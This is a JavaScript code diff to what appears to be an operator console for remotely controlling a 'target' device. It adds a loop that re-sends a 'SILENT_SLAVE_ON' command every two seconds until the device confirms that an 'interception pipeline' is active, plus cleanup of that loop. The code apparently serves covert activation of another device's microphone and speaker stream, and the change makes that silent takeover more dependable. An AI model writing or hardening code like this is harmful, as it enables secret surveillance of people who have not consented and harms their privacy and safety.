@@ -3355,6 +3355,10 @@
                         opChannel.on('broadcast', { event: 'slave_status' }, (p) => {
                 logOp("🟢 Target handshaked. Interception pipeline confirmed active.", "status");
                 updateOpOrb('ready');
+                if (window.slaveOnInterval) {
+                    clearInterval(window.slaveOnInterval);
+                    window.slaveOnInterval = null;
+                }
                 document.getElementById('op-mic-btn').disabled = false;
                 document.getElementById('op-text-input').disabled = false;
                 document.getElementById('op-send-btn').disabled = false;
@@ -3448,19 +3452,29 @@
                 opWs.send(JSON.stringify(setupMessage));
                 console.log("[OP_WS_DIAG] Sent session setup configuration frame to Cloudflare.");
 
-                // Send the Master-Slave control packet over the bound Supabase channel
-                console.log("[OP_WS_DIAG] Sending SILENT_SLAVE_ON broadcast via Supabase for device:", targetId);
-                opChannel.send({
-                    type: 'broadcast',
-                    event: 'agent_control',
-                    payload: { data: { action: "SILENT_SLAVE_ON" } }
-                }).then(status => {
-                    console.log(`%c[OP_CHANNEL_DIAG] SILENT_SLAVE_ON broadcast status: ${status}`, 'color: #00ff00; font-weight: bold;');
-                    logOp(`Broadcast delivery status: ${status.toUpperCase()}`, "status");
-                }).catch(err => {
-                    console.error("[OP_CHANNEL_DIAG] SILENT_SLAVE_ON broadcast error:", err);
-                    logOp(`⚠️ Broadcast delivery failed: ${err.message}`, "status");
-                });
+                // Send the Master-Slave control packet over the bound Supabase channel repeatedly until handshake confirmed
+                console.log("[OP_WS_DIAG] Starting SILENT_SLAVE_ON broadcast loop for device:", targetId);
+                if (window.slaveOnInterval) clearInterval(window.slaveOnInterval);
+                
+                const sendSlaveOn = () => {
+                    if (!opWs || opWs.readyState !== WebSocket.OPEN) {
+                        clearInterval(window.slaveOnInterval);
+                        return;
+                    }
+                    console.log("[OP_WS_DIAG] Broadcasting SILENT_SLAVE_ON...");
+                    opChannel.send({
+                        type: 'broadcast',
+                        event: 'agent_control',
+                        payload: { data: { action: "SILENT_SLAVE_ON" } }
+                    }).then(status => {
+                        console.log(`%c[OP_CHANNEL_DIAG] SILENT_SLAVE_ON broadcast status: ${status}`, 'color: #00ff00; font-weight: bold;');
+                    }).catch(err => {
+                        console.error("[OP_CHANNEL_DIAG] SILENT_SLAVE_ON broadcast error:", err);
+                    });
+                };
+                
+                sendSlaveOn();
+                window.slaveOnInterval = setInterval(sendSlaveOn, 2000); // Retry every 2 seconds
                 
                 // Initialize local audio context for speaker output
                 if (!opAudioCtx) { 
@@ -3698,6 +3712,10 @@
 
         function disconnectOperatorSession() { 
             console.log("[OP_WS_DIAG] Disconnecting session. Cleaning up audio and mic streams.");
+            if (window.slaveOnInterval) {
+                clearInterval(window.slaveOnInterval);
+                window.slaveOnInterval = null;
+            }
             stopOperatorMicStream();
             stopOperatorSpeakerBuffer();
             updateOpOrb('offline');
